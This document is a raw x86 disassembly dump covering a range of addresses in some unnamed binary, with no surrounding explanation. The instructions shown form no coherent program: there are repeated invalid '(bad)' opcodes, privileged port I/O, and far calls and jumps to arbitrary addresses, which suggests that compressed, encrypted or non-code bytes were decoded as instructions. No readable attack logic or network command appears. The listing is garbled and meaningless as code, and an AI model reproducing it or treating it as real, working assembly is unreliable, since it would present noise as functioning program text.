  41e9a9:	push   ebp
  41e9aa:	out    0x0,al
  41e9ac:	xlat   BYTE PTR ds:[ebx]
  41e9ad:	pop    ebp
  41e9ae:	test   eax,0xccce65e7
  41e9b3:	or     esi,edi
  41e9b5:	imul   edx,ecx,0x6f
  41e9b8:	and    eax,0x87752c93
  41e9bd:	or     esp,DWORD PTR [ebp+0x3c15ddb7]
  41e9c3:	or     al,0xf1
  41e9c5:	std    
  41e9c6:	fs dec ebp
  41e9c8:	pop    edx
  41e9c9:	sub    BYTE PTR [ecx+0x63],al
  41e9cc:	and    esi,esp
  41e9ce:	add    al,0x32
  41e9d0:	mov    cl,BYTE PTR [edx-0x2d5bd161]
  41e9d6:	inc    ebx
  41e9d7:	ins    BYTE PTR es:[edi],dx
  41e9d8:	push   ecx
  41e9d9:	push   ecx
  41e9da:	add    BYTE PTR [ebx-0x76],ch
  41e9dd:	xlat   BYTE PTR ds:[ebx]
  41e9de:	ret    0x8313
  41e9e1:	shl    edx,0xe3
  41e9e4:	jl     0x41ea65
  41e9e6:	loop   0x41e986
  41e9e8:	pop    eax
  41e9e9:	iret   
  41e9ea:	popa   
  41e9eb:	cli    
  41e9ec:	repz adc al,0xc6
  41e9ef:	and    BYTE PTR [edx-0x75106f4f],ch
  41e9f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9f6:	ds ss cmp eax,0xe0eb67cd
  41e9fd:	xchg   ecx,eax
  41e9fe:	sbb    al,0xc0
  41ea00:	fisub  WORD PTR ds:0xb3845925
  41ea06:	aaa    
  41ea07:	call   0xa193:0x76e2cd23
  41ea0e:	ficomp WORD PTR [esi+0x3ea4138b]
  41ea14:	popa   
  41ea15:	pusha  
  41ea16:	or     BYTE PTR [esi],cl
  41ea18:	push   eax
  41ea19:	xchg   ebx,eax
  41ea1a:	call   0xaa41b9dd
  41ea1f:	push   cs
  41ea20:	dec    ecx
  41ea21:	imul   ebx,DWORD PTR [esi-0x53a916fb],0x9045b150
  41ea2b:	sub    DWORD PTR [edi-0x1da4a416],ebp
  41ea31:	stos   BYTE PTR es:[edi],al
  41ea32:	repnz mov DWORD PTR [edi-0x43],ebp
  41ea36:	jbe    0x41ea9e
  41ea38:	mov    ds:0x93a0a76c,al
  41ea3d:	dec    ecx
  41ea3e:	(bad)  
  41ea3f:	scas   eax,DWORD PTR es:[edi]
  41ea40:	lock inc edx
  41ea42:	inc    eax
  41ea43:	(bad)  
  41ea44:	fsubr  st,st(2)
  41ea46:	sub    BYTE PTR [esi+ebx*8],ah
  41ea49:	add    bl,bh
  41ea4b:	dec    edx
  41ea4c:	shl    DWORD PTR [edx-0x77108cf6],cl
  41ea52:	mov    bl,BYTE PTR [eax-0x2b]
  41ea55:	cmc    
  41ea56:	addr16 out dx,al
  41ea58:	stos   DWORD PTR es:[edi],eax
  41ea59:	mov    al,gs:0xd5b40b6
  41ea5f:	arpl   WORD PTR [ecx-0x7d],si
  41ea62:	xchg   edx,eax
  41ea63:	add    BYTE PTR [ebp-0x22],al
  41ea66:	fwait
  41ea67:	pop    es
  41ea68:	fcom   st(0)
  41ea6a:	lods   eax,DWORD PTR ds:[esi]
  41ea6b:	out    0x60,eax
  41ea6d:	dec    ecx
  41ea6e:	pusha  
  41ea6f:	lea    ebp,[esi]
  41ea71:	mov    esi,0x5450a0ea
  41ea76:	xchg   DWORD PTR [eax+edi*8],esi
  41ea79:	aas    
  41ea7a:	push   edx
  41ea7b:	xchg   esi,eax
  41ea7c:	(bad)  
  41ea7d:	pop    ds
  41ea7e:	and    BYTE PTR [eax],al
  41ea80:	out    0x5e,eax
  41ea82:	pop    edx
  41ea83:	push   esp
  41ea84:	fist   DWORD PTR [esi+ebp*1-0x70b184d0]
  41ea8b:	popa   
  41ea8c:	or     bh,ah
  41ea8e:	imul   BYTE PTR [eax+0x2e]
  41ea91:	loop   0x41eade
  41ea93:	ins    BYTE PTR es:[edi],dx
  41ea94:	xchg   edx,eax
  41ea95:	bound  edi,QWORD PTR [ebx-0x1]
  41ea98:	scas   eax,DWORD PTR es:[edi]
  41ea99:	mov    ds:0x10c6d627,eax
  41ea9e:	inc    ebp
  41ea9f:	dec    eax
  41eaa0:	arpl   WORD PTR [ebx-0x4f],bx
  41eaa3:	jbe    0x41ea57
  41eaa5:	(bad)  
  41eaa7:	push   cs
  41eaa8:	sbb    BYTE PTR [edx+0xf9ee22e],bl
  41eaae:	bound  ecx,QWORD PTR ds:0x1d824710
  41eab4:	mov    dl,0xe1
  41eab6:	jle    0x41eacd
  41eab8:	xchg   ebx,eax
  41eab9:	fsubr  DWORD PTR [edx-0xa]
  41eabc:	scas   al,BYTE PTR es:[edi]
  41eabd:	popa   
  41eabe:	ins    BYTE PTR es:[edi],dx
  41eabf:	leave  
  41eac0:	cld    
  41eac1:	or     esp,esi
  41eac3:	jne    0x41ea77
  41eac5:	stos   DWORD PTR es:[edi],eax
  41eac6:	dec    DWORD PTR [ebp-0x6f5eeded]
  41eacc:	sbb    esp,DWORD PTR [edi]
  41eace:	stc    
  41eacf:	or     DWORD PTR [esi-0x784f85fc],edi
  41ead5:	shl    ebx,0xee
  41ead8:	xor    al,0x54
  41eada:	fstp   TBYTE PTR [esi-0x63]
  41eadd:	mov    ebx,0xccd7ec47
  41eae2:	ja     0x41ea6b
  41eae4:	mov    eax,0xdab075d5
  41eae9:	xchg   DWORD PTR [ecx+0xc],ecx
  41eaec:	retf   
  41eaed:	push   0x76
  41eaef:	push   0x3d04488e
  41eaf4:	dec    edx
  41eaf5:	pop    edx
  41eaf6:	ins    DWORD PTR es:[edi],dx
  41eaf7:	in     al,0xd4
  41eaf9:	mul    BYTE PTR [ebx+ebx*4]
  41eafc:	jle    0x41eb04
  41eafe:	retf   0x6292
  41eb01:	or     DWORD PTR ds:0x3b3ec752,0x97fc2676
  41eb0b:	xchg   edi,eax
  41eb0c:	daa    
  41eb0d:	push   eax
  41eb0e:	repz cli 
  41eb10:	mov    dh,0x73
  41eb12:	xchg   BYTE PTR [edx],bl
  41eb14:	xor    al,0xa2
  41eb16:	std    
  41eb17:	das    
  41eb18:	ins    DWORD PTR es:[edi],dx
  41eb19:	scas   al,BYTE PTR es:[edi]
  41eb1a:	adc    bh,0x96
  41eb1d:	pusha  
  41eb1e:	add    al,0x75
  41eb20:	sahf   
  41eb21:	ficomp DWORD PTR [edx-0x66]
  41eb24:	ret    
  41eb25:	(bad)  
  41eb26:	mov    ds:0x1306bd08,eax
  41eb2b:	in     al,dx
  41eb2c:	dec    edi
  41eb2d:	jmp    0xb0807e0c
  41eb32:	jo     0x41eaf5
  41eb34:	cmp    eax,0x6c2fe95d
  41eb39:	cmp    al,0x1a
  41eb3b:	pop    ss
  41eb3c:	or     DWORD PTR ds:0x9a58253,esp
  41eb42:	xchg   BYTE PTR [esi],cl
  41eb44:	cdq    
  41eb45:	shr    esi,1
  41eb47:	lods   al,BYTE PTR ds:[esi]
  41eb48:	add    ah,dh
  41eb4a:	xchg   edi,eax
  41eb4b:	in     eax,0x33
  41eb4d:	jne    0x41eb15
  41eb4f:	mov    ebp,0x912fc451
  41eb54:	sbb    al,0x3a
  41eb56:	rol    DWORD PTR [edx],cl
  41eb58:	lea    esi,[ecx+esi*8+0x40]
  41eb5c:	shr    esi,1
  41eb5e:	js     0x41eb2b
  41eb60:	aam    0xc8
  41eb62:	ror    eax,1
  41eb64:	add    BYTE PTR [ecx-0x72d6b092],0x59
  41eb6b:	pop    es
  41eb6c:	sar    bh,1
  41eb6e:	mov    esi,0xa6580100
  41eb73:	adc    BYTE PTR [ebx-0x77ab9e11],cl
  41eb79:	cs (bad) 
  41eb7b:	push   esi
  41eb7c:	dec    esp
  41eb7d:	lods   eax,DWORD PTR ds:[esi]
  41eb7e:	inc    ebp
  41eb7f:	rol    dh,cl
  41eb81:	adc    BYTE PTR [eax],0xd
  41eb84:	adc    DWORD PTR [edi],esp
  41eb86:	fiadd  WORD PTR [eax-0x71326c51]
  41eb8c:	or     BYTE PTR [edi],dh
  41eb8e:	lea    ecx,[edx-0x6d]
  41eb91:	call   DWORD PTR [eax-0x37d05129]
  41eb97:	or     cl,BYTE PTR [eax+0x6b]
  41eb9a:	pusha  
  41eb9b:	sub    BYTE PTR [edi],al
  41eb9d:	xchg   ebx,ecx
  41eb9f:	xchg   ecx,eax
  41eba0:	or     eax,0x7cc8638f
  41eba5:	js     0x41eb47
  41eba7:	rcr    dl,1
  41eba9:	icebp  
  41ebaa:	jl     0x41eb79
  41ebac:	mov    bl,0x1c
  41ebae:	repz retf 0xbdb7
  41ebb2:	adc    eax,0x156b72eb
  41ebb7:	fadd   st(7),st
  41ebb9:	adc    edi,ecx
  41ebbb:	jl     0x41ec17
  41ebbd:	stos   DWORD PTR es:[edi],eax
  41ebbe:	push   eax
  41ebbf:	push   ebp
  41ebc0:	daa    
  41ebc1:	and    ebp,DWORD PTR [eax]
  41ebc3:	push   ebx
  41ebc4:	and    BYTE PTR [edx-0x3b],0x26
  41ebc8:	shl    ah,cl
  41ebca:	inc    eax
  41ebcb:	dec    edi
  41ebcc:	lds    esi,FWORD PTR [edi-0x4e]
  41ebcf:	jp     0x41ebec
  41ebd1:	dec    eax
  41ebd2:	jns    0x41ebd8
  41ebd4:	push   ss
  41ebd5:	call   0x44f5:0x8579bcf1
  41ebdc:	leave  
  41ebdd:	std    
  41ebde:	sbb    eax,edi
  41ebe0:	inc    edx
  41ebe1:	and    DWORD PTR [eax],0x46571a19
  41ebe7:	xchg   edx,eax
  41ebe8:	mov    ch,0x58
  41ebea:	clc    
  41ebeb:	inc    edx
  41ebec:	inc    bh
  41ebee:	jno    0x41ebdd
  41ebf0:	xchg   ebp,eax
  41ebf1:	mov    al,ds:0x3895e77c
  41ebf6:	les    esp,FWORD PTR cs:[edx-0x7b]
  41ebfa:	xor    DWORD PTR [ecx],0xdb3aa30e
  41ec00:	scas   al,BYTE PTR es:[edi]
  41ec01:	inc    edx
  41ec02:	cwde   
  41ec03:	call   FWORD PTR [eax+0x72]
  41ec06:	pop    edi
  41ec07:	and    al,0x66
  41ec09:	push   edi
  41ec0a:	js     0x41ebf5
  41ec0c:	mov    eax,ds:0x643615cb
  41ec11:	leave  
  41ec12:	jno    0x41ebbc
  41ec14:	xchg   edx,eax
  41ec15:	lods   al,BYTE PTR ds:[esi]
  41ec16:	and    DWORD PTR [ecx-0x7e14cb1],esi
  41ec1c:	cmp    esi,DWORD PTR [eax+0x9]
  41ec1f:	call   0x6cbe:0xdc3c8c7f
  41ec26:	call   0xcfed132
  41ec2b:	inc    edx
  41ec2c:	xor    bh,BYTE PTR [ebx]
  41ec2e:	imul   esp,ecx,0xa1511a6c
  41ec34:	adc    eax,0xd0449dc7
  41ec39:	int    0x13
  41ec3b:	sub    bl,BYTE PTR [ebx-0x49]
  41ec3e:	jno    0x41ecaa
  41ec40:	xor    edx,DWORD PTR [esi-0x184bc560]
  41ec46:	push   ss
  41ec47:	cld    
  41ec48:	aaa    
  41ec49:	iret   
  41ec4a:	lock inc ebx
  41ec4c:	shl    DWORD PTR [ebp-0x578f5746],0x35
  41ec53:	push   ss
  41ec54:	xchg   esi,eax
  41ec55:	push   edx
  41ec56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec57:	in     al,0x4f
  41ec59:	xor    esi,0x7fa3318c
  41ec5f:	pop    edx
  41ec60:	sub    ecx,esi
  41ec62:	mov    edi,0xe2b72d03
  41ec67:	mov    DWORD PTR ds:[ebp+0x64050a49],ebp
  41ec6e:	stos   BYTE PTR es:[edi],al
  41ec6f:	hlt    
  41ec70:	ds icebp 
  41ec72:	or     al,0xed
  41ec74:	and    ebp,DWORD PTR [ebp+0x290ff567]
  41ec7a:	mov    esi,0x415cd776
  41ec7f:	(bad)  
  41ec80:	(bad)  [ecx-0x78]
  41ec83:	add    DWORD PTR [eax+eiz*2-0x7443c592],edx
  41ec8a:	mov    dl,ah
  41ec8c:	js     0x41ecf2
  41ec8e:	mov    al,0x30
  41ec90:	ror    ebp,0xeb
  41ec93:	aaa    
  41ec94:	(bad)
  41ec97:	add    DWORD PTR [eax+edx*1],ebp
  41ec9a:	and    ch,BYTE PTR [ecx-0x52]
  41ec9d:	sbb    al,0x9d
  41ec9f:	and    esp,ecx
  41eca1:	pushf  
  41eca2:	repz arpl cx,ax
  41eca5:	mov    ?,WORD PTR [ebp+0x7d]
  41eca8:	pop    ebx
  41eca9:	clc    
  41ecaa:	je     0x41eceb
  41ecac:	mov    edx,0xcc2898a6
  41ecb1:	mov    ch,0xe1
  41ecb3:	mov    al,0xac
  41ecb5:	xor    eax,0xda395fc4
  41ecba:	mov    eax,0xc158cc8e
  41ecbf:	aam    0x47
  41ecc1:	add    esi,DWORD PTR [ecx+0x8]
  41ecc4:	jno    0x41ed11
  41ecc6:	loope  0x41ed24
  41ecc8:	int3   
  41ecc9:	mov    dh,0xed
  41eccb:	mov    eax,ds:0xf619ca4a
  41ecd0:	xlat   BYTE PTR ds:[ebx]
  41ecd1:	mov    esi,0xe95adb72
  41ecd6:	int    0x34
  41ecd8:	push   edi
  41ecd9:	gs stc 
  41ecdb:	mov    edx,0xee514476
  41ece0:	ror    DWORD PTR [edi+0x56c883e8],cl
  41ece6:	in     eax,dx
  41ece7:	(bad)  
  41ece8:	(bad)  
  41ece9:	jecxz  0x41ecf1
  41eceb:	lock and ah,BYTE PTR [edi+0x7a84b167]
  41ecf2:	dec    edi
  41ecf3:	iret   
  41ecf4:	mov    esi,0x3174a910
  41ecf9:	pusha  
  41ecfa:	cmp    eax,0xc17205d4
  41ecff:	pop    ss
  41ed00:	push   0xacd28928
  41ed05:	mov    dl,0x4d
  41ed07:	mov    cl,BYTE PTR [esi+0x64]
  41ed0a:	and    eax,DWORD PTR [edx-0x15]
  41ed0d:	fisubr WORD PTR [ebp-0x79]
  41ed10:	mov    ds:0x26a2eff1,al
  41ed15:	fiadd  WORD PTR [edx-0x46f0f79d]
  41ed1b:	fdiv   DWORD PTR [eax]
  41ed1d:	xor    cl,ah
  41ed1f:	out    0x84,eax
  41ed21:	jecxz  0x41ecab
  41ed23:	jae    0x41ece0
  41ed25:	xor    eax,0x4a6ca1a8
  41ed2a:	xchg   esi,eax
  41ed2b:	sbb    al,BYTE PTR [esi]
  41ed2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed2e:	xchg   BYTE PTR [ebp+ebp*8-0x96bae71],dh
  41ed35:	pop    eax
  41ed36:	in     eax,dx
  41ed37:	and    ebp,ecx
  41ed39:	inc    eax
  41ed3a:	dec    eax
  41ed3b:	out    dx,al
  41ed3c:	xchg   DWORD PTR [ebp-0x1b],esp
  41ed3f:	jae    0x41ed12
  41ed41:	aad    0xd6
  41ed43:	cwde   
  41ed44:	aam    0xea
  41ed46:	dec    eax
  41ed47:	xchg   BYTE PTR ds:0x432f79c8,cl
  41ed4d:	push   0xffffff95
  41ed4f:	cmp    eax,DWORD PTR [edi+0x42536d2c]
  41ed55:	in     al,dx
  41ed56:	jmp    0x1780:0x2e86267d
  41ed5d:	cdq    
  41ed5e:	dec    ecx
  41ed5f:	pop    ds
  41ed60:	mov    cl,0x99
  41ed62:	mov    es,WORD PTR [eax-0x162f0dee]
  41ed68:	mov    edx,0x343461a6
  41ed6d:	rol    BYTE PTR [ebx-0x141729fa],1
  41ed73:	jp     0x41ede4
  41ed75:	addr16 adc al,0xc6
  41ed78:	mov    ds:0x52d39037,al
  41ed7d:	jne    0x41ede3
  41ed7f:	xchg   esi,eax
  41ed80:	pop    eax
  41ed81:	jns    0x41ed3b
  41ed83:	and    ch,BYTE PTR [eax+0x1c]
  41ed86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed87:	jmp    0x41ed30
  41ed89:	mov    esi,DWORD PTR [ecx+0x50]
  41ed8c:	fcompp 
  41ed8e:	xchg   esi,ebp
  41ed90:	ja     0x41ee11
  41ed92:	sub    edx,DWORD PTR [edx-0x24]
  41ed95:	dec    edx
  41ed96:	sub    al,0x6d
  41ed98:	adc    edx,esi
  41ed9a:	mov    ch,0x69
  41ed9c:	lods   eax,DWORD PTR ds:[esi]
  41ed9d:	out    dx,ax
  41ed9f:	or     BYTE PTR [ecx+0x4eefdb2],bl
  41eda5:	sub    BYTE PTR [esi+ecx*8-0x546fb17],cl
  41edac:	jg     0x41ed85
  41edae:	in     eax,dx
  41edaf:	ss dec ecx
  41edb1:	retf   
  41edb2:	ficom  WORD PTR [edx]
  41edb4:	mov    ebp,DWORD PTR [ecx+0x11]
  41edb7:	add    al,0xef
  41edb9:	jp     0x41eda7
  41edbb:	(bad)  
  41edbc:	push   edi
  41edbd:	ss aam 0x88
  41edc0:	lods   eax,DWORD PTR ds:[esi]
  41edc1:	int3   
  41edc2:	mov    bh,0xc5
  41edc4:	shl    DWORD PTR [edi-0x53],1
  41edc7:	adc    cl,BYTE PTR [esi+0x72927da9]
  41edcd:	das    
  41edce:	pusha  
  41edcf:	adc    eax,0x82aca27c
  41edd4:	std    
  41edd5:	xor    BYTE PTR [edi-0x1b],dl
  41edd8:	mov    ebx,0x268bffd3
  41eddd:	test   esi,esi
  41eddf:	mov    bl,0x36
  41ede1:	jne    0x41ed65
  41ede3:	call   0x8cc:0x33012b50
  41edea:	push   0xffffffdb
  41edec:	aad    0xeb
  41edee:	mov    esi,0xe423d38b
  41edf3:	sbb    ecx,DWORD PTR [eax+0x6497b2b3]
  41edf9:	mov    WORD PTR [esp+eax*2+0x77],es
  41edfd:	jl     0x41eda5
  41edff:	repnz idiv DWORD PTR [ecx+0x32a90773]
  41ee06:	pop    es
  41ee07:	jae    0x41ede7
  41ee09:	popa   
  41ee0a:	xchg   DWORD PTR [edi+0x1],ebp
  41ee0d:	out    dx,eax
  41ee0e:	aas    
  41ee0f:	pusha  
  41ee10:	pop    ebx
  41ee11:	or     al,0x45
  41ee13:	jns    0x41ee42
  41ee15:	shr    DWORD PTR [eax-0x33],cl
  41ee18:	pop    edx
  41ee19:	addr16 jnp 0x41ee2d
  41ee1c:	xor    al,0xed
  41ee1e:	leave  
  41ee1f:	data16 adc al,0x40
  41ee22:	adc    BYTE PTR [edx+0x4898424],dl
  41ee28:	(bad)  
  41ee29:	jns    0x41ee43
  41ee2b:	inc    esp
  41ee2c:	xor    ecx,0xffffff90
  41ee2f:	mov    ch,0xe4
  41ee31:	fcom   QWORD PTR [edi-0x50]
  41ee34:	mov    ds:0x7e02bfa7,al
  41ee39:	mov    bl,BYTE PTR [ebx+0x1f4d857b]
  41ee3f:	inc    ecx
  41ee40:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee42:	aaa    
  41ee43:	add    eax,0xe45c785
  41ee48:	push   ds
  41ee49:	sub    DWORD PTR [edx-0x2e],0x1a717966
  41ee50:	sub    DWORD PTR [ebp-0x4b],eax
  41ee53:	test   edx,ebp
  41ee55:	iret   
  41ee56:	adc    bh,BYTE PTR cs:[esi+0x7d]
  41ee5a:	xchg   edx,eax
  41ee5b:	push   0xf866b3f8
  41ee60:	icebp  
  41ee61:	sbb    cl,al
  41ee63:	ins    BYTE PTR es:[edi],dx
  41ee64:	iret   
  41ee65:	adc    BYTE PTR [ebp-0x2],dl
  41ee68:	dec    esi
  41ee69:	rcl    ebx,1
  41ee6b:	clc    
  41ee6c:	jnp    0x41ee65
  41ee6e:	out    dx,eax
  41ee6f:	test   eax,0x64f9c246
  41ee74:	mov    ebx,0xcb2753bb
  41ee79:	push   es
  41ee7a:	cs pop esi
  41ee7c:	add    al,0xe8
  41ee7e:	push   edx
  41ee7f:	lds    eax,FWORD PTR [edx+0x37]
  41ee82:	push   eax
  41ee83:	pop    es
  41ee84:	nop
  41ee85:	into   
  41ee86:	push   ebx
  41ee87:	into   
  41ee88:	mov    DWORD PTR [edx-0x21cf6e15],ebp
  41ee8e:	shl    BYTE PTR [edi+0x5fd3a815],cl
  41ee94:	jbe    0x41ee52
  41ee96:	sub    BYTE PTR [ecx+0x76754f73],bl
  41ee9c:	add    ebx,DWORD PTR [ebp+0x365340df]
  41eea2:	cmp    eax,0x15bf665c
  41eea7:	aad    0xaf
  41eea9:	leave  
  41eeaa:	push   ds
  41eeab:	sbb    edi,ebx
  41eead:	fstp   st(2)
  41eeaf:	or     al,0x2f
  41eeb1:	(bad)  
  41eeb2:	fdiv   QWORD PTR [esi+0x5f24f175]
  41eeb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eeb9:	pushf  
  41eeba:	mov    eax,0x43748a5b
  41eebf:	xor    BYTE PTR [ebp+0x684fb577],0xbf
  41eec6:	test   eax,0xe47389bf
  41eecb:	sub    BYTE PTR [ebx-0x40020166],ch
  41eed1:	mov    eax,ds:0xd5ffee4e
  41eed6:	test   BYTE PTR [esi+0x40ae7fc],al
  41eedc:	mov    es,ecx
  41eede:	ins    DWORD PTR es:[edi],dx
  41eedf:	test   eax,0x102fd06b
  41eee4:	ror    bl,0x69
  41eee7:	inc    esp
  41eee8:	hlt    
  41eee9:	into   
  41eeea:	ror    bh,1
  41eeec:	push   0x8b72b7f0
  41eef1:	mov    DWORD PTR [ebp+0x2d],edx
  41eef4:	inc    ebx
  41eef5:	gs call 0x3eabf4c1
  41eefb:	sbb    dh,cl
  41eefd:	mov    dh,0xf0
  41eeff:	rcr    BYTE PTR [ecx],cl
  41ef01:	loop   0x41eee8
  41ef03:	sub    BYTE PTR [ecx+0x26],dl
  41ef06:	(bad)  
  41ef07:	cmp    ebx,edx
  41ef09:	sbb    eax,0x862ef46
  41ef0e:	not    BYTE PTR [ebx]
  41ef10:	mov    eax,ds:0xca63dc2a
  41ef15:	repz mov ch,bl
  41ef18:	push   0x1f
  41ef1a:	pop    edi
  41ef1b:	fisubr WORD PTR [ebx-0x7]
  41ef1e:	or     eax,ebp
  41ef20:	fnstcw WORD PTR [edi+0x5ecc5a9]
  41ef26:	pop    ecx
  41ef27:	jb     0x41ef8c
  41ef29:	push   esp
  41ef2a:	fs add al,0xd9
  41ef2d:	push   eax
  41ef2e:	mov    dh,0xb7
  41ef30:	mov    dh,0x9
  41ef32:	push   eax
  41ef33:	dec    edi
  41ef34:	adc    ah,BYTE PTR [ebp-0x5]
  41ef37:	movups xmm1,XMMWORD PTR [ebp+0x5a]
  41ef3b:	outs   dx,BYTE PTR ds:[esi]
  41ef3c:	mov    bh,0x30
  41ef3e:	cmp    eax,DWORD PTR [ebp-0x56]
  41ef41:	inc    esi
  41ef42:	pop    esp
  41ef43:	inc    ebx
  41ef44:	inc    eax
  41ef45:	into   
  41ef46:	sub    bh,BYTE PTR [edx+edi*4-0x35]
  41ef4a:	xor    DWORD PTR [esi+0x36],0x79
  41ef4e:	and    edx,eax
  41ef50:	aad    0x7f
  41ef52:	sti    
  41ef53:	pop    es
  41ef54:	adc    edx,ebx
  41ef56:	std    
  41ef57:	jb     0x41efac
  41ef59:	and    al,0x2d
  41ef5b:	scas   eax,DWORD PTR es:[edi]
  41ef5c:	or     al,0x6b
  41ef5e:	fcom   st(0)
  41ef60:	mov    edi,0x353f0978
  41ef65:	push   ecx
  41ef66:	retf   
  41ef67:	cwde   
  41ef68:	adc    cl,BYTE PTR ds:[ebx+0x9]
  41ef6c:	cmp    DWORD PTR [ecx-0x6e6c034c],ebx
  41ef72:	push   ebp
  41ef73:	xchg   ebx,eax
  41ef74:	push   edi
  41ef75:	ss es mov es,edx
  41ef79:	push   esi
  41ef7a:	test   BYTE PTR [ecx+ecx*8],0x2a
  41ef7e:	retf   
  41ef7f:	pop    es
  41ef80:	add    al,BYTE PTR ds:0x8d303779
  41ef86:	repz arpl WORD PTR [esi],dx
  41ef89:	test   eax,0x9acbb953
  41ef8e:	cmp    DWORD PTR [edi-0x1cf5a64d],edx
  41ef94:	out    dx,al
  41ef95:	stos   BYTE PTR es:[edi],al
  41ef96:	cs dec eax
  41ef98:	(bad)  
  41ef99:	sub    ecx,DWORD PTR [ebx-0x70]
  41ef9c:	mov    ch,0x5e
  41ef9e:	jecxz  0x41efb0
  41efa0:	sti    
  41efa1:	fdiv   QWORD PTR [esi-0x39]
  41efa4:	dec    ebp
  41efa5:	inc    eax
  41efa6:	pop    ebp
  41efa7:	mov    edx,edx
  41efa9:	push   esi
  41efaa:	cwde   
  41efab:	push   esp
  41efac:	pop    ss
  41efad:	jecxz  0x41ef41
  41efaf:	cmp    BYTE PTR es:[edx],dh
  41efb2:	inc    ebx
  41efb3:	jp     0x41f004
  41efb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efb6:	pop    ss
  41efb7:	push   edx
  41efb8:	jl     0x41ef7b
  41efba:	loope  0x41ef9c
  41efbc:	adc    al,0x70
  41efbe:	cmp    eax,0xfe75a378
  41efc3:	rol    ebx,cl
  41efc5:	inc    eax
  41efc6:	daa    
  41efc7:	and    edx,DWORD PTR [eax-0x13e1a7d3]
  41efcd:	imul   ebx,DWORD PTR [edi-0x777d6c90],0x9ec8400e
  41efd7:	aaa    
  41efd8:	mov    esi,0x60bc45b0
  41efdd:	dec    eax
  41efde:	sbb    ebx,esi
  41efe0:	lahf   
  41efe1:	jb     0x41f050
  41efe3:	gs push esi
  41efe5:	mov    dh,0xf7
  41efe7:	adc    dl,BYTE PTR [eax]
  41efe9:	inc    ecx
  41efea:	jo     0x41f04d
  41efec:	les    ebp,FWORD PTR [ebp+0x4b6c5515]
  41eff2:	sahf   
  41eff3:	or     eax,0xe2b28931
  41eff8:	inc    ecx
  41eff9:	xor    al,BYTE PTR [ecx]
  41effb:	imul   edi,DWORD PTR [ebp+0x44],0xffffffc6
  41efff:	cmc    
  41f000:	(bad)  
  41f001:	jne    0x41efb7
  41f003:	sub    BYTE PTR [esi-0x39],dh
  41f006:	xchg   ebx,eax
  41f007:	(bad)  
  41f008:	or     eax,0x38514518
  41f00d:	in     al,0x9b
  41f00f:	jge    0x41f064
  41f011:	cli    
  41f012:	in     eax,0xc
  41f014:	(bad)  
  41f015:	mov    bl,0x11
  41f017:	push   ds
  41f018:	fidiv  DWORD PTR [ecx+0x29f4957b]
  41f01e:	jnp    0x41f00f
  41f020:	clc    
  41f021:	jae    0x41efe6
  41f023:	idiv   BYTE PTR [edx+0x4a947eee]
  41f029:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f02a:	and    BYTE PTR [ecx+esi*8+0x221b6f81],ah
  41f031:	pusha  
  41f032:	add    al,0xd9
  41f034:	inc    ebx
  41f035:	xor    DWORD PTR [edx-0x20],0xffffff8d
  41f039:	cdq    
  41f03a:	pop    es
  41f03b:	imul   edi,eax,0x24eca885
  41f041:	cdq    
  41f042:	sbb    DWORD PTR [eax],0xffffffcc
  41f045:	shl    BYTE PTR [edi],cl
  41f047:	add    esp,DWORD PTR [esp+edi*1-0x7f]
  41f04b:	adc    ebp,ebp
  41f04d:	jbe    0x41f01c
  41f04f:	outs   dx,BYTE PTR ds:[esi]
  41f050:	pop    esp
  41f051:	les    ebp,FWORD PTR [eax+0x63]
  41f054:	test   BYTE PTR [ecx-0xd],al
  41f057:	in     eax,0xd1
  41f059:	jecxz  0x41f088
  41f05b:	out    0x50,eax
  41f05d:	mov    es,WORD PTR [ecx+0x68426694]
  41f063:	mov    ds:0x41b84c11,al
  41f068:	fidivr WORD PTR gs:[eax-0x7bbcd32b]
  41f06f:	pop    ebx
  41f070:	adc    BYTE PTR [esi-0x72],dl
  41f073:	cwde   
  41f074:	loopne 0x41f07e
  41f076:	in     eax,0xab
  41f078:	in     eax,0x6c
  41f07a:	shl    BYTE PTR ds:0x37b2da0d,0xc9
  41f081:	call   0x97c3:0xa6df8f78
  41f088:	push   esp
  41f089:	mov    dl,0xdd
  41f08b:	adc    al,0x33
  41f08d:	jl     0x41f037
  41f08f:	add    eax,0x10d8c55
  41f094:	pop    ecx
  41f095:	outs   dx,BYTE PTR ds:[esi]
  41f096:	fimul  DWORD PTR [ebp+eiz*8+0x20e42bea]
  41f09d:	icebp  
  41f09e:	sub    ecx,DWORD PTR [ebx]
  41f0a0:	ror    DWORD PTR [esi+0x7a1f7499],1
  41f0a6:	sti    
  41f0a7:	js     0x41f08f
  41f0a9:	xchg   edx,eax
  41f0aa:	in     eax,dx
  41f0ab:	inc    edi
  41f0ac:	shl    DWORD PTR [ebp+0x474ed0ca],0xe3
  41f0b3:	push   ecx
  41f0b4:	std    
  41f0b5:	test   al,bh
  41f0b7:	jg     0x41f0f8
  41f0b9:	or     BYTE PTR [ebx+0x1c],cl
  41f0bc:	mov    al,ds:0xd2f412c2
  41f0c1:	pop    ecx
  41f0c2:	(bad)  
  41f0c3:	xor    edx,DWORD PTR [esi]
  41f0c5:	mov    WORD PTR [esi+esi*2-0x24e43c02],es
  41f0cc:	repnz push ebx
  41f0ce:	adc    cl,BYTE PTR [edx+0x57]
  41f0d1:	(bad)  
  41f0d2:	xchg   esp,eax
  41f0d3:	xor    ah,dh
  41f0d5:	repnz xchg ebp,eax
  41f0d7:	add    eax,0x45cfaa73
  41f0dc:	fisub  DWORD PTR [ebp+0x10]
  41f0df:	dec    ebx
  41f0e0:	pop    ebp
  41f0e1:	shr    DWORD PTR [edx-0xb86c022],1
  41f0e7:	dec    esp
  41f0e8:	inc    esi
  41f0e9:	mov    ecx,0xa7c40fef
  41f0ee:	ins    BYTE PTR es:[edi],dx
  41f0ef:	aaa    
  41f0f0:	jo     0x41f100
  41f0f2:	stos   BYTE PTR es:[edi],al
  41f0f3:	cmp    BYTE PTR [esi-0x36],bl
  41f0f6:	xor    BYTE PTR [edx+esi*8],0x92
  41f0fa:	ss mov ah,0x29
  41f0fd:	stos   DWORD PTR es:[edi],eax
  41f0fe:	imul   esp,DWORD PTR [eax+eax*8+0x28],0xffffffb1
